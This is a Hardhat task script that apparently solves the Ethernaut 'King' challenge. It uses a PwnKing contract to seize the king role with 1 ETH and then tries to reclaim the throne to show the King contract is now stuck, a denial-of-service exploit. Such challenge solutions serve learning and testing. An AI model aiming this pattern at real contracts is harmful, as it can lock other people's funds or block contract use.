import { task } from 'hardhat/config';
import { BigNumber, ContractReceipt, ContractTransaction } from 'ethers';
import { King, PwnKing } from '../../typechain';
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/dist/src/signer-with-address';
import { TASK_PWN } from '../task-names';
import { Network } from '@ethersproject/networks/lib/types';

import kingAbi from '../../data/abi/King.json';
import pwnAbi from '../../data/abi/PwnKing.json';

task(TASK_PWN, 'Deposit into King with selfdestruct')
  .setAction(async (_taskArgs, hre) => {

    const wallets: SignerWithAddress[] = await hre.ethers.getSigners();
    const userWallet = wallets[1];

    const address = await userWallet.getAddress();
    console.log(`user address: ${address}`);

    const network: Network = await hre.ethers.provider.getNetwork();
    console.log(`network: ${network.name}`);

    let contractAddress = '';
    let pwnContractAddress = '';
    if (network.name === 'rinkeby') {
      contractAddress = process.env.RINKEBY_KING_CONTRACT_ADDRESS || '';
      pwnContractAddress = process.env.RINKEBY_PWNKING_CONTRACT_ADDRESS || '';
    } else if (network.name === 'unknown') { //localhost network
      contractAddress = process.env.LOCALHOST_KING_CONTRACT_ADDRESS || '';
      pwnContractAddress = process.env.LOCALHOST_PWNKING_CONTRACT_ADDRESS || '';
    }

    const kingContract: King = new hre.ethers.Contract(contractAddress, kingAbi, userWallet) as King;
    const pwnKingContract: PwnKing = new hre.ethers.Contract(pwnContractAddress, pwnAbi, userWallet) as PwnKing;

    // deployerWallet is King
    console.log(`King Contract Address: ${contractAddress}`);
    console.log(`King: ${await kingContract._king()}`);

    // Pwn Contract
    const enoughEthToBecomeKing: BigNumber = hre.ethers.BigNumber.from('1000000000000000000');
    await pwnKingContract.pwn({ value: enoughEthToBecomeKing });

    // PwnContract Address is new King
    console.log(`PwnKing Contract address: ${pwnKingContract.address}`);
    console.log(`King: ${await kingContract._king()}`);

    // Break King Contract
    await userWallet.call({ to: kingContract.address, value: enoughEthToBecomeKing });

    process.exit(0)
  });